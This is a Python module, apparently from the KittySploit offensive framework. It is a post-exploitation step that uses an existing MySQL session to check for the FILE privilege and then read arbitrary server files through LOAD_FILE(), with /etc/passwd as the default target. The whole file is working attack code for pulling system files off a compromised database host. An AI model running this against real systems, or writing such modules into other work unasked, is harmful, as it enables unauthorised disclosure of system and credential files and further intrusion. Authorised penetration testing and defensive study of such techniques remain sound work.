from kittysploit import *
from core.framework.failure import ProcedureError, FailureType
from lib.protocols.mysql.mysql_client import MySQLClient

class Module(Post, MySQLClient):

	__info__ = {
		"name": "MySQL Read File",
		"description": "Read files from filesystem using MySQL LOAD_FILE() - requires FILE privilege",
		"author": "KittySploit Team",
		"session_type": SessionType.MYSQL,
	}	

	file_path = OptString("/etc/passwd", "File path to read", True)

	def run(self):
		"""Read file using LOAD_FILE"""
		try:
			if not self.check_privilege('FILE'):
				raise ProcedureError(FailureType.NotAccess, "FILE privilege required for LOAD_FILE")
			
			print_success("FILE privilege confirmed")
			
			secure_file_priv = self.get_secure_file_priv()
			if secure_file_priv and secure_file_priv != '':
				print_warning(f"secure_file_priv is set to: {secure_file_priv}")
				if not self.file_path.startswith(secure_file_priv):
					print_warning(f"File path must be within {secure_file_priv}")
			
			print_info(f"Reading file: {self.file_path}")
			content = self.load_file(self.file_path)
			
			if content:
				print_success("File content:")
				print_info(content)
				return True
			else:
				raise ProcedureError(FailureType.NotAccess, "File not found or cannot be read")
			
		except ProcedureError:
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error reading file: {e}")

